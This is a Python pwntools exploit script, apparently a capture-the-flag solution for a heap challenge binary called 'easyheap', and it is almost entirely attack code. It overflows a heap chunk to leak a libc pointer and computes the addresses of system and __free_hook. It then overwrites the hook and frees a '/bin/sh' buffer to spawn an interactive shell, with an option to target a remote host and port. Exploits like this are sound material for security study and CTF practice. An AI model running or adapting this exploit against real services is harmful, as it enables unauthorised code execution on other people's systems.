from pwn import *

sys_off = 0x46590

def alloc(size, data):

	p.recvuntil('Choice:')
	p.sendline('1')

	p.recvuntil('Size:')
	p.sendline(str(size))

	p.recvuntil('Content:\n')
	p.sendline(data)

	return

def edit(idx, size, data):

	p.recvuntil('Choice:')
	p.sendline('2')

	p.recvuntil('id:')
	p.sendline(str(idx))

	p.recvuntil('Size:')
	p.sendline(str(size))

	p.recvuntil('Content:\n')
	p.sendline(data)

	return

def free(idx):

	p.recvuntil('Choice:')
	p.sendline('4')

	p.recvuntil('id:')
	p.sendline(str(idx))

	return

def list():

	p.recvuntil('Choice:')
	p.sendline('3')

	return

def pwn():

	alloc(20, 'A'*10)
	alloc(20, 'B'*10)
	alloc(0x80, 'C'*10)
	alloc(0x80, 'D'*10)
  
        # Populating the smallbin with a pointer to main_arena
	free(2)

	payload = 'Z'*64
        # Since there's no null-byte termination, we can overflow
        # the chunk up until the pointer to main_arena
	edit(1, 80, payload)
	
	list()

	p.recvuntil(payload)

	# Leaking main_arena pointer
	leak        = u64(p.recv(6).ljust(8, '\x00'))
	libc        = leak - 0x3c17b8
	system      = libc + sys_off
	free_hook   = leak + 0x2258

	log.info("Leak:        0x{:x}".format(leak))
	log.info("Libc:        0x{:x}".format(libc))
	log.info("__free_hook: 0x{:x}".format(free_hook))
	log.info("system:      0x{:x}".format(system))

	payload  = 'A'*40
	payload += p64(free_hook)
  
        # Overflowing the second alloc'd chunk to contain the pointer
        # to __free_hook instead of the pointer to our data
        # Next time edit() is called on the 2nd chunk, we fool the binary into thinking
        # that we want to edit the address of __free_hook
	edit(0, 50, payload)
  
        # __free_hook => system
	edit(1, 10, p64(system))
  
	edit(0, 10, '/bin/sh\x00')

	free(0)

	p.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        p = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        p = process('./easyheap')
        pause()
        pwn()
